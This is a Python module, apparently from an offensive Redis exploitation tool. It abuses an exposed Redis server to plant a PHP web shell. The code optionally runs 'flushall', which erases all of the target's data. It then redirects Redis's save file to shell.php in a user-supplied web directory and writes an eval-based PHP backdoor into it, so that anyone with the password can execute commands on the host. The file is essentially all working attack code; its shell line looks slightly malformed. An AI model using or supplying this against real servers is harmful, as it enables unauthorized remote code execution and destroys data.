from lib.Decorator import CatchPrivilegeException, CatchConnectionException, CatchKeyboardException


class ShellInjection:
    @CatchKeyboardException
    def __init__(self, Controller):
        self.s = input("Input web shell path: ")
        self.r = Controller.r
        self.flush = Controller.options.flush
        print("SHELL PATH " + str(self.s))
        self.shellInject()

    @CatchPrivilegeException
    @CatchConnectionException
    def shellInject(self):
        if self.flush is not True:
            self.r.execute_command("flushall")
        print("[*]config setting")
        self.r.config_set("dir", self.s)
        self.r.config_set("dbfilename", "shell.php")
        self.r.set("xxx", "\n\n<?php @eval($_POST[adw122@]);?>\n\n")
        print("[*]saving")
        self.r.save()
        print("attack succeeded!")
